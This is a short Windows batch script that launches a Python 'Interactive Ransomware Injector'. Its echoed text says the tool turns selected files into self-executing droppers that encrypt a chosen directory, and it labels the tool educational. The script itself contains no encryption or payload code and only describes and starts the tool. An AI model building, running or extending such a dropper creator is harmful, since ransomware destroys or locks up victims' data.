@echo off
REM START INTERACTIVE FILE SELECTOR INJECTOR
REM Launches the Interactive Ransomware Injector GUI
REM Creates self-executing droppers from selected files
REM Educational purposes only - safe file selection interface

title Interactive File Selector Injector - Educational Tool
echo ==================================================
echo   INTERACTIVE RANSOMWARE INJECTOR
echo   Self-Executing Dropper Creator
echo ==================================================
echo Features:
echo - Select files to convert to droppers
echo - Choose target directory for encryption
echo - Multiple dropper formats (Python, Batch, PowerShell)
echo - Real-time preview and confirmation
echo - Educational warning systems
echo - Safe file selection interface
echo ==================================================
echo.

cd /d "C:\Users\Kanhaiya\System And Security\educational_demos"

echo Starting Interactive File Selector Injector...
echo This tool allows you to:
echo 1. Select existing files to convert to droppers
echo 2. Choose which directory to encrypt when executed
echo 3. Configure dropper settings and extensions
echo 4. Create self-executing ransomware files
echo.

python simulators/interactive_injector.py

echo.
echo ==================================================
echo Interactive injector closed
echo Created droppers can be executed to demonstrate ransomware behavior
echo ==================================================
pause